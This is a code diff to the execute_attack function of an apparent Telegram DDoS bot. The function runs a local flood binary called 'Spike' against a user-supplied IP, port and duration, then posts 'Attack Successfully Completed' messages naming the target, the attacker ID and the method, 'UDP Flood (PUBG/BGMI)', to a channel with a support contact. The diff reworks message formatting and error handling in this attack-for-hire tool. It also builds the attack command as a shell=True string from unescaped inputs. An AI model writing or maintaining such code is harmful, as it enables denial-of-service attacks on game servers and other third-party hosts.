@@ -354,7 +354,7 @@ async def execute_attack(ip, port, duration, user_id):
         if not os.access(binary_path, os.X_OK):
             raise Exception("Attack binary 'Spike' is not executable (run: chmod +x Spike)")
 
-        # Prepare the attack command with your specified parameters
+        # Prepare the attack command
         cmd = f"{binary_path} {ip} {port} {duration} 12 750"
         
         # Debug logging
@@ -368,11 +368,10 @@ async def execute_attack(ip, port, duration, user_id):
             shell=True
         )
 
-        # Wait for completion with timeout (duration + 30 seconds buffer)
+        # Wait for completion with timeout
         try:
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 30)
             
-            # Check return code
             if proc.returncode != 0:
                 error_output = stderr.decode().strip() if stderr else "No error output"
                 raise Exception(f"Attack failed with code {proc.returncode}. Error: {error_output}")
@@ -382,40 +381,64 @@ async def execute_attack(ip, port, duration, user_id):
             await proc.wait()
             raise Exception(f"Attack timed out after {duration + 30} seconds")
 
-        # Successful attack
+        # Escape special characters for Markdown
+        def escape_markdown(text):
+            return re.sub(r'([_*\[\]()~`>#+-=|{}.!])', r'\\\1', str(text))
+
+        # Successful attack message
         success_msg = f"""
-        🚀 *Attack Successfully Completed!*
-        
-        🎯 *Target:* `{ip}:{port}`
-        ⏳ *Duration:* {duration} seconds
-        👤 *Attacker:* `{user_id}`
-        🛠️ *Method:* PUBG/BGMI - UDP 
-        
+🚀 *Attack Successfully Completed*
+
+🎯 *Target:* `{escape_markdown(ip)}:{escape_markdown(port)}`
+⏱️ *Duration:* {escape_markdown(duration)} seconds
+👤 *Attacker ID:* `{escape_markdown(user_id)}`
+⚡ *Method:* UDP Flood (PUBG/BGMI)
         """
         
-        bot.send_message(
-            CHANNEL_ID,
-            success_msg,
-            parse_mode='Markdown'
-        )
+        # Send success message
+        try:
+            await bot.send_message(
+                CHANNEL_ID,
+                success_msg,
+                parse_mode='MarkdownV2'
+            )
+        except Exception as e:
+            logging.error(f"Failed to send success message: {e}")
+            await bot.send_message(
+                CHANNEL_ID,
+                "✅ Attack completed successfully!",
+                parse_mode=None
+            )
+
         log_action("ATTACK_SUCCESS", user_id, f"{ip}:{port} for {duration}s")
 
     except Exception as e:
+        # Error message
         error_msg = f"""
-        ❌ *Attack Failed!*
-        
-        🎯 *Target:* `{ip}:{port}`
-        ⏳ *Duration:* {duration}s
-        💦 *Error:* `{str(e)}`
-        
-        Please try again or contact support.
+❌ *Attack Failed*
+
+🎯 *Target:* `{ip}:{port}`
+⏱️ *Duration:* {duration}s
+💥 *Error:* {str(e)[:300]}...
+
+Contact @Titanop24 for support
         """
         
-        bot.send_message(
-            CHANNEL_ID,
-            error_msg,
-            parse_mode='Markdown'
-        )
+        # Send error message
+        try:
+            await bot.send_message(
+                CHANNEL_ID,
+                error_msg,
+                parse_mode='MarkdownV2'
+            )
+        except Exception as msg_error:
+            logging.error(f"Failed to send error message: {msg_error}")
+            await bot.send_message(
+                CHANNEL_ID,
+                f"❌ Attack failed: {str(e)[:300]}...",
+                parse_mode=None
+            )
+
         log_action("ATTACK_FAILED", user_id, f"{ip}:{port} - {str(e)}")
         raise
 
